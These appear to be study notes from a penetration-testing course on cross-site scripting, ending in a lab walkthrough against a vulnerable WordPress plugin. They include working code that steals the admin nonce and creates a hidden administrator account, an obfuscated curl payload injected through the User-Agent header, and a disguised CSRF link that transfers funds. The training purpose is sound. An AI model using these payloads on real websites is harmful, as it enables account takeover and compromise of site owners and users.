One of the most important features of a well-defended web application is _data sanitization_,[1](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/cross-site-scripting-44558/cross-site-scripting-44560#fn-local_id_24-1) a process in which user input is processed so that all dangerous characters or strings are removed or transformed. Unsanitized data allows an attacker to inject, and potentially execute, malicious code.

_Cross-Site Scripting_ (XSS)[2](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/cross-site-scripting-44558/cross-site-scripting-44560#fn-local_id_24-2) is a vulnerability that exploits a user's trust in a website by dynamically injecting content into the page rendered by the user's browser.

### 8.4.1 Stored vs Reflected XSS Theory

These can both manifest client (browser), server side, or DOM-based.

**Stored** - Persistent XSS attacks stored in a database or cached by server. Payload is displayed to anyone who visits vulnerable web page. Often exist in forums. Found in:
	- comment sections
	- product reviews
**Reflected** - These XSS are typically crafted requests or links. Web app takes the value and places it into the page content. Only attacks one person sending the request/visiting link. Found in:
	- Search fields/results
	- Error messages with user input
**DOM-Based**- Occurs only within page's *Document Object Model (DOM).* This XSS attack occurs when browser parses the page's content and inserted JavaScript is executed. 

### 8.4.2 JavaScript Refresher

All modern browsers have a JavaScript engine for executing JS within the browser itself. 

When a browser processes a server's HTTP response containing HTML, the browser creates a DOM tree and renders it. The DOM is comprised of all forms, inputs, images, etc. related to the web page.

JavaScript's role is to access and modify the page's DOM, resulting in a more interactive user experience.

An attacker can also inject JavaScript to access and modify the page's DOM. 

Access to DOM means we can redirect login forms, extract passwords, and steal session cookies. 

Simple JavaScript Function

```javascript
function multiplyValues(x,y) {
  return x * y;
}
 
let a = multiplyValues(3, 5)
console.log(a)
```

Testing the JavaScript Function in the Browser Console

![Figure 25: Testing the JavaScript Function in the Browser Console](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/89c0b15a538a12feb35cdbecff45908b-xss1.png)

### 8.4.3. Identifying XSS Vulnerabilities

Identify input fields (search fields) that accept unsanitized input. I.E. Enter common special characters on a web page and see if any return unfiltered.

The most common special characters used for this purpose include:

```
< > ' " { } ;
```

Purpose of these characters:

`< >` - in HTML, these denote *elements*

`{ }`- in JavaScript, these are function declarations
`' "`- denote strings
`;`- mark the end of statement

If these characters aren't removed or encoded, the app will interpret these characters as code which would enable additional (malicious) code.

**HTML Encoding** (_character references_)- Used to display characters that normally have special meaning. "<" is the character reference for "<". Browser won't interpret this as start of an element, but will display character as is. 

**URL Encoding** (_percent encoding_)- Converts non-ascii and reserved characters in URLs. It will convert a space to "%20" 

### 8.4.4 Basic XSS

Inspecting Visitors Plugin Record Visualization Function

```
$i=count(VST_get_records($date_start, $date_finish));
foreach(VST_get_records($date_start, $date_finish) as $record) {
    echo '
        <tr class="active" >
            <td scope="row" >'.$i.'</td>
            <td scope="row" >'.date_format(date_create($record->datetime), get_option("links_updated_date_format")).'</td>
            <td scope="row" >'.$record->patch.'</td>
            <td scope="row" ><a href="https://www.geolocation.com/es?ip='.$record->ip.'#ipresult">'.$record->ip.'</a></td>
            <td>'.$record->useragent.'</td>
        </tr>';
    $i--;
}
```

Notice that the _useragent_ record value is retrieved from the database and inserted plainly in the Table Data (_td_) HTML tag, without any sort of data sanitization.

User-Agent header is under user control, we could craft an XSS attack by inserting a script tag invoking the _alert()_ method to generate a pop-up message.

Craft this XSS attack using #burpsuite 

Send page of interest to Repeater tab.

Forward request to repeater:

![Figure 26: Forwarding the request to the Repeater](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/e113a6b758f58011df96c74634acfe7a-xss2.png)

Replace default User-Agent value with `<script>alert(42)</script>`

![Figure 27: Forwarding the request to the Repeater](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/4c19765da365cf9670d55561426a85d6-xss3.png)

Navigate to webpage and see that the XSS worked. 

![Figure 28: Demonstrating the XSS vulnerability](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/e425b9f0955de47c2a7449749956d4d9-xss4.png)


### 8.4.5 Privilege Escalation via XSS

Can use XSS to steal cookies from an authenticated user easily _if_:

**Secure** flag, which instructs browser to only send cookie over HTTPS, is disabled 

**HttpOnly** flag, which instructs browser to deny JavaScript access to the cookie, is disabled

Determine if this is possible by opening web developer tools, navigate to storage tab, click on URL, view cookies menu on left.

Inspecting Wordpress cookies:

![Figure 29: Inspecting WordPress Cookies](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/726cdb96ca41edf13970f3204c6e9335-xss5.png)

Because HttpOnly is true for potential cookies we could steal, we cannot retrieve these via JavaScript. 

Need different attack. 

We could craft a JavaScript function that adds another WordPress administrative account, so that once the real administrator executes our injected code, the function will execute behind the scenes.

First, we'll create a JS function that fetches the WordPress admin _nonce_.[6](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/cross-site-scripting-44558/privilege-escalation-via-xss-44525#fn-local_id_89-6)

The nonce is a server-generated token that is included in each HTTP request to add randomness and prevent _Cross-Site-Request-Forgery_ (CSRF)[7](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/cross-site-scripting-44558/privilege-escalation-via-xss-44525#fn-local_id_89-7) attacks.

A CSRF attack occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalf of the user.

The malicious link could be disguised by an apparently-harmless description, often luring the victim to click on it.

Example CSRF attack:

```
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>
```

This URL link is pointing to Fake Crypto Bank API and transfers bitcoin to attacker account.

If link is embedded in the HTML of an email, user would only see link description. 

This attack would succeed if user is logged in with valid session on the same website.

Gathering WordPress Nonce

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

This function performs a new HTTP request towards the **/wp-admin/user-new.php**URL and saves the nonce value found in the HTTP response based on the regular expression. The regex pattern matches any alphanumeric value contained between the string _/ser" value="_ and double quotes.

Creating a New WordPress Administrator Account

```JavaScript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

If this succeeds we'll gain full admin privileges on the site. 

To ensure that our JavaScript payload will be handled correctly by Burp and the target application, we need to first minify it, then encode it.

To minify our attack code into a one-liner, we can navigate to JS Compress.[8](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/cross-site-scripting-44558/privilege-escalation-via-xss-44525#fn-local_id_89-8)

![Figure 30: Minifying the XSS attack code](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/2a2f4dbcc913552bb7d442fa94655ba3-xss6.png)

Copy and save output locally. 

Encode minified JS code with

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

The _encode_to_javascript_ function will parse the minified JS string parameter and convert each character into the corresponding UTF-16 integer code using the _charCodeAt_[9](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/cross-site-scripting-44558/privilege-escalation-via-xss-44525#fn-local_id_89-9) method.

Encoding the Minified JS with the Browser Console

![Figure 31: Encoding the Minified JS with the Browser Console](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/90fa49369352cbf0dc80ea7dd2c19564-xss7.png)

Launching the Final XSS Attack through Curl

```
kali@kali:~$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

Before running this, start Burp with intercept on. 

We instructed curl to send a specially-crafted HTTP request with a User-Agent header containing our malicious payload, then forward it to our Burp instance so we can inspect it further.

![Figure 32: Inspecting the Attack in Burp](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/b0c5559626ac4e29fa8040c431e7aaa8-xss8.png)

Forward the request.

 XSS exploit should have been stored in the WordPress database. We only need to simulate execution by logging in to the OffSec WP instance as admin, then clicking on the Visitors plugin dashboard on the bottom left

![Figure 33: Loading Visitors Statistics](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/d64d2d202ef9d66aa74802ab070c77b1-xss9.png)

Confirming that our Attack Succeeded

![Figure 34: Confirming that our Attack Succeeded](https://static.offsec.com/offsec-courses/PEN-200/imgs/webintro/9d0dac705ec8e4521f66c5b752de9739-xss10.png)

Due to this XSS flaw, we managed to elevate our application privileges from a standard user to administrator via a specially-crafted HTTP request.

We could now advance our attack and gain access to the underlying host by crafting a custom WordPress plugin with an embedded web shell
